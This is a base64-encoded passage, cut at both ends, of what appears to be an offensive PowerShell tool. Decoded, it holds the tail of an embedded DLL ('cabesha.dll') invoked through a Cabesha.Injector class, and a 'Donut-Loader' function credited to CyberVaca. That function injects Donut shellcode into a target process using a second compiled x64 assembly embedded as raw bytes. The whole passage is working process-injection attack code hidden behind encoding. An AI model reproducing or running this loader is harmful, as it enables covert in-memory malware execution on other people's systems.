DExMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTc2LCA0LCA0NCwgMiwgMCwgMCwgMSwgMCwgODMsIDAsIDExNiwgMCwgMTE0LCAwLCAxMDUsIDAsIDExMCwgMCwgMTAzLCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgNzMsIDAsIDExMCwgMCwgMTAyLCAwLCAxMTEsIDAsIDAsIDAsIDgsIDIsIDAsIDAsIDEsIDAsIDQ4LCAwLCA0OCwgMCwgNDgsIDAsIDQ4LCAwLCA0OCwgMCwgNTIsIDAsIDk4LCAwLCA0OCwgMCwgMCwgMCwgNTYsIDAsIDgsIDAsIDEsIDAsIDcwLCAwLCAxMDUsIDAsIDEwOCwgMCwgMTAxLCAwLCA2OCwgMCwgMTAxLCAwLCAxMTUsIDAsIDk5LCAwLCAxMTQsIDAsIDEwNSwgMCwgMTEyLCAwLCAxMTYsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDAsIDAsIDk5LCAwLCA5NywgMCwgOTgsIDAsIDEwMSwgMCwgMTE1LCAwLCAxMDQsIDAsIDk3LCAwLCAwLCAwLCA2NCwgMCwgMTUsIDAsIDEsIDAsIDcwLCAwLCAxMDUsIDAsIDEwOCwgMCwgMTAxLCAwLCA4NiwgMCwgMTAxLCAwLCAxMTQsIDAsIDExNSwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgMCwgMCwgNDksIDAsIDQ2LCAwLCA0OCwgMCwgNDYsIDAsIDU1LCAwLCA0OCwgMCwgNTYsIDAsIDUxLCAwLCA0NiwgMCwgNDksIDAsIDU2LCAwLCA1MywgMCwgNTQsIDAsIDUwLCAwLCAwLCAwLCAwLCAwLCA1NiwgMCwgMTIsIDAsIDEsIDAsIDczLCAwLCAxMTAsIDAsIDExNiwgMCwgMTAxLCAwLCAxMTQsIDAsIDExMCwgMCwgOTcsIDAsIDEwOCwgMCwgNzgsIDAsIDk3LCAwLCAxMDksIDAsIDEwMSwgMCwgMCwgMCwgOTksIDAsIDk3LCAwLCA5OCwgMCwgMTAxLCAwLCAxMTUsIDAsIDEwNCwgMCwgOTcsIDAsIDQ2LCAwLCAxMDAsIDAsIDEwOCwgMCwgMTA4LCAwLCAwLCAwLCA2OCwgMCwgMTUsIDAsIDEsIDAsIDc2LCAwLCAxMDEsIDAsIDEwMywgMCwgOTcsIDAsIDEwOCwgMCwgNjcsIDAsIDExMSwgMCwgMTEyLCAwLCAxMjEsIDAsIDExNCwgMCwgMTA1LCAwLCAxMDMsIDAsIDEwNCwgMCwgMTE2LCAwLCAwLCAwLCA2NywgMCwgMTExLCAwLCAxMTIsIDAsIDEyMSwgMCwgMTE0LCAwLCAxMDUsIDAsIDEwMywgMCwgMTA0LCAwLCAxMTYsIDAsIDMyLCAwLCA1MCwgMCwgNDgsIDAsIDQ5LCAwLCA1NywgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDEyLCAwLCAxLCAwLCA3OSwgMCwgMTE0LCAwLCAxMDUsIDAsIDEwMywgMCwgMTA1LCAwLCAxMTAsIDAsIDk3LCAwLCAxMDgsIDAsIDcwLCAwLCAxMDUsIDAsIDEwOCwgMCwgMTAxLCAwLCAxMTAsIDAsIDk3LCAwLCAxMDksIDAsIDEwMSwgMCwgMCwgMCwgOTksIDAsIDk3LCAwLCA5OCwgMCwgMTAxLCAwLCAxMTUsIDAsIDEwNCwgMCwgOTcsIDAsIDQ2LCAwLCAxMDAsIDAsIDEwOCwgMCwgMTA4LCAwLCAwLCAwLCA0OCwgMCwgOCwgMCwgMSwgMCwgODAsIDAsIDExNCwgMCwgMTExLCAwLCAxMDAsIDAsIDExNywgMCwgOTksIDAsIDExNiwgMCwgNzgsIDAsIDk3LCAwLCAxMDksIDAsIDEwMSwgMCwgMCwgMCwgMCwgMCwgOTksIDAsIDk3LCAwLCA5OCwgMCwgMTAxLCAwLCAxMTUsIDAsIDEwNCwgMCwgOTcsIDAsIDAsIDAsIDY4LCAwLCAxNSwgMCwgMSwgMCwgODAsIDAsIDExNCwgMCwgMTExLCAwLCAxMDAsIDAsIDExNywgMCwgOTksIDAsIDExNiwgMCwgODYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTUsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDQ5LCAwLCA0NiwgMCwgNDgsIDAsIDQ2LCAwLCA1NSwgMCwgNDgsIDAsIDU2LCAwLCA1MSwgMCwgNDYsIDAsIDQ5LCAwLCA1NiwgMCwgNTMsIDAsIDU0LCAwLCA1MCwgMCwgMCwgMCwgMCwgMCwgNzIsIDAsIDE1LCAwLCAxLCAwLCA2NSwgMCwgMTE1LCAwLCAxMTUsIDAsIDEwMSwgMCwgMTA5LCAwLCA5OCwgMCwgMTA4LCAwLCAxMjEsIDAsIDMyLCAwLCA4NiwgMCwgMTAxLCAwLCAxMTQsIDAsIDExNSwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgNDksIDAsIDQ2LCAwLCA0OCwgMCwgNDYsIDAsIDU1LCAwLCA0OCwgMCwgNTYsIDAsIDUxLCAwLCA0NiwgMCwgNDksIDAsIDU2LCAwLCA1MywgMCwgNTQsIDAsIDUwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgMTIsIDAsIDAsIDAsIDk2LCA1NywgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCkpIHwgb3V0LW51bGwgCiRiaW5hcmlvICA9ICRhcmcuc3BsaXQoIiAsIilbMF0KJGFyZyA9ICRhcmcuUmVwbGFjZSgiJGJpbmFyaW8gIiwiIikuc3BsaXQoIiwiKSB8IFNlbGVjdC1PYmplY3QgLVNraXAgMQokYXJndW1lbnRvcyA9ICRiaW5hcmlvCmZvcmVhY2ggKCRhcmd1bWVudG8gaW4gJGFyZykgewpbYXJyYXldJGFyZ3VtZW50b3MgKz0gJGFyZ3VtZW50bwoKfQpbQ2FiZXNoYS5JbmplY3Rvcl06OkV4ZWN1dGUoJGFyZ3VtZW50b3MpfQp9CmZ1bmN0aW9uIERvbnV0LUxvYWRlciB7cGFyYW0oJHByb2Nlc3NfaWQsJGRvbnV0ZmlsZSkKICAgICRoZWxwPUAiCi5TWU5PUFNJUwogICAgRG9udXQgTG9hZGVyLgogICAgUG93ZXJTaGVsbCBGdW5jdGlvbjogRG9udXQtTG9hZGVyCiAgICBBdXRob3I6IEx1aXMgVmFjYXMgKEN5YmVyVmFjYSkKICAgIEJhc2VkIGNvZGU6IFRoZVdvdmVyCgogICAgUmVxdWlyZWQgZGVwZW5kZW5jaWVzOiBOb25lCiAgICBPcHRpb25hbCBkZXBlbmRlbmNpZXM6IE5vbmUKLkRFU0NSSVBUSU9OCiAgICAKLkVYQU1QTEUKICAgIERvbnV0LUxvYWRlciAtcHJvY2Vzc19pZCAyMTk1IC1kb251dGZpbGUgL2hvbWUvY3liZXJ2YWNhL2RvbnV0LmJpbgogICAgRG9udXQtTG9hZGVyIC1wcm9jZXNzX2lkIChnZXQtcHJvY2VzcyBub3RlcGFkKS5pZCAtZG9udXRmaWxlIC9ob21lL2N5YmVydmFjYS9kb251dC5iaW4KCiAgICBEZXNjcmlwdGlvbgogICAgLS0tLS0tLS0tLS0KICAgIEZ1bmN0aW9uIHRoYXQgbG9hZHMgYW4gYXJiaXRyYXJ5IGRvbnV0IDpECiJACmlmICgkcHJvY2Vzc19pZCAtZXEgJG51bGwgLW9yICRkb251dGZpbGUgLWVxICRudWxsKSB7d3JpdGUtaG9zdCAiJGhlbHBgbiJ9IGVsc2UgCnsKaWYgKChbSW50UHRyXTo6U2l6ZSkgLWVxIDQpIHt3cml0ZS1ob3N0ICJTb3JyeSwgdGhpcyBmdW5jdGlvbiBvbmx5IHdvcmsgb24geDY0IDooIjsgYnJlYWt9CltieXRlW11dJGJ5dGVzID0gNzcsIDkwLCAxNDQsIDAsIDMsIDAsIDAsIDAsIDQsIDAsIDAsIDAsIDI1NSwgMjU1LCAwLCAwLCAxODQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxMjgsIDAsIDAsIDAsIDE0LCAzMSwgMTg2LCAxNCwgMCwgMTgwLCA5LCAyMDUsIDMzLCAxODQsIDEsIDc2LCAyMDUsIDMzLCA4NCwgMTA0LCAxMDUsIDExNSwgMzIsIDExMiwgMTE0LCAxMTEsIDEwMywgMTE0LCA5NywgMTA5LCAzMiwgOTksIDk3LCAxMTAsIDExMCwgMTExLCAxMTYsIDMyLCA5OCwgMTAxLCAzMiwgMTE0LCAxMTcsIDExMCwgMzIsIDEwNSwgMTEwLCAzMiwgNjgsIDc5LCA4MywgMzIsIDEwOSwgMTExLCAxMDAsIDEwMSwgNDYsIDEzLCAxMywgMTAsIDM2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA4MCwgNjksIDAsIDAsIDEwMCwgMTM0LCAyLCAwLCA0MSwgNjQsIDEzOSwgOTMsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDI0MCwgMCwgMzQsIDMyLCAxMSwgMiwgMTEsIDAsIDAsIDE2LCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMzIsIDAsIDAsIDAsIDAsIDY0LCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgMCwgMTYsIDAsIDAsIDQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDk2LCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMCwgMCwgMywgMCwgOTYsIDEzMywgMCwgMCwgNjQsIDAsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMCwgMCwgMzIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2NCwgMCwgMCwgODgsIDMsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDIwLCA0NSwgMCwgMCwgMjgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDMyLCAwLCAwLCA3MiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNDYsIDExNiwgMTAxLCAxMjAsIDExNiwgMCwgMCwgMCwgNzYsIDE0LCAwLCAwLCAwLCAzMiwgMCwgMCwgMCwgMTYsIDAsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgOTYsIDQ2LCAxMTQsIDExNSwgMTE0LCA5OSwgMCwgMCwgMCwgODgsIDMsIDAsIDAsIDAsIDY0LCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMzIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAwLCA2NCwgNDYsIDExNCwgMTAxLCAxMDgsIDExMSwgOTksIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDk2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA0OCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDY2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLC